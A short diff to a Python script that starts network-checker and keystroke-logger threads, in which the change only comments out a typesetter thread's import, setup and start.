@@ -5,7 +5,7 @@ import sys
 import os
 from network import NetworkThread
 from logger import LoggerThread
-from typesetter import TypesetterThread
+#from typesetter import TypesetterThread
 import traceback
 
 exitFlag = 0
@@ -19,16 +19,16 @@ if __name__ == "__main__":
 
     networkCheckerThread = NetworkThread(2)
     loggerThread = LoggerThread()
-    typesetterThread = TypesetterThread("")
+#    typesetterThread = TypesetterThread("")
     # Make the network checker thread daemonic so we don't have to control it
     networkCheckerThread.daemon = True
     loggerThread.daemon = True
-    typesetterThread.daemon = True
+#    typesetterThread.daemon = True
     # Start new Network checker thread
     networkCheckerThread.start()
     # start the key loggin thread
     loggerThread.start()
-    typesetterThread.start()
+#    typesetterThread.start()
     #thread2.start()
     try:
         while True:
